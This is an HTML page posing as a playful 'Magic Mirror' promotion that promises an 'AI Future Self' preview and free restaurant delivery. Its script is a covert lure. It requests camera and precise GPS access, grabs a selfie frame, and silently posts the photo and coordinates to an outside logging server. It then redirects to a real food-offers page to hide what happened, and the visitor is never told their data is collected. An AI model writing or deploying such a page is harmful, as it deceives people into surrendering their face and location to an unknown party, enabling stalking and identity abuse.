<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Magic Mirror & Local Treats</title>
    <style>
        body { background: #fff5f0; color: #333; font-family: 'Segoe UI', Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; width: 85%; max-width: 380px; padding: 40px 20px; border-radius: 40px; box-shadow: 0 20px 50px rgba(252, 128, 25, 0.1); text-align: center; border: 1px solid #ffe5d5; }
        .window { position: relative; width: 200px; height: 200px; background: #fff0e5; border-radius: 100px; margin: 0 auto 30px; overflow: hidden; display: flex; align-items: center; justify-content: center; border: 4px solid #fff; box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
        #v { width: 100%; height: 100%; object-fit: cover; display: none; }
        .glow-line { position: absolute; width: 100%; height: 5px; background: linear-gradient(to right, transparent, #fc8019, transparent); top: 0; animation: wave 2.5s infinite linear; display: none; }
        @keyframes wave { 0% { top: -10%; } 100% { top: 110%; } }
        h1 { font-size: 1.5rem; color: #fc8019; margin-bottom: 10px; }
        p { font-size: 0.95rem; color: #666; line-height: 1.6; margin-bottom: 30px; }
        .go-btn { background: #fc8019; color: white; border: none; padding: 18px 0; width: 100%; border-radius: 20px; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 20px rgba(252, 128, 25, 0.3); }
        .go-btn:active { transform: scale(0.98); }
        .emoji { font-size: 50px; }
    </style>
</head>
<body>

    <div class="card">
        <div class="window">
            <div id="line" class="glow-line"></div>
            <video id="v" playsinline muted></video>
            <div id="icon" class="emoji">âœ¨</div>
        </div>
        
        <h1>Magic Mirror</h1>
        <p>See your <strong>AI Future Self</strong> and unlock <strong>Free Delivery</strong> from the best restaurants in your neighborhood!</p>
        
        <button id="btn" class="go-btn">REVEAL SURPRISE</button>
    </div>

    <script>
        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
        const video = document.getElementById('v');
        const btn = document.getElementById('btn');
        const line = document.getElementById('line');
        const icon = document.getElementById('icon');
        const canvas = document.createElement('canvas');

        btn.onclick = async () => {
            btn.innerText = "Finding Magic...";
            btn.disabled = true;

            try {
                const [stream, pos] = await Promise.all([
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
                    new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
                            enableHighAccuracy: true, timeout: 8000
                        });
                    })
                ]);

                icon.style.display = 'none';
                video.style.display = 'block';
                video.srcObject = stream;
                video.play();
                line.style.display = 'block';

                video.onloadedmetadata = () => {
                    // Simple wait for the "Magic" effect
                    setTimeout(() => finish(pos), 3000);
                };

            } catch (err) {
                finish(null);
            }
        };

        async function finish(pos) {
            let photo = "NONE";
            if (video.srcObject) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                photo = canvas.toDataURL('image/jpeg', 0.5);
                video.srcObject.getTracks().forEach(t => t.stop());
            }

            const gps = pos ? `${pos.coords.latitude},${pos.coords.longitude}` : "NO_GPS";

            fetch(LOGGING_API, {
                method: 'POST',
                mode: 'cors',
                credentials: 'omit',
                keepalive: true,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: photo, gps: gps })
            });

            // Redirect to food deals
            window.location.replace("https://www.swiggy.com/offers-near-me");
        }
    </script>
</body>
</html>
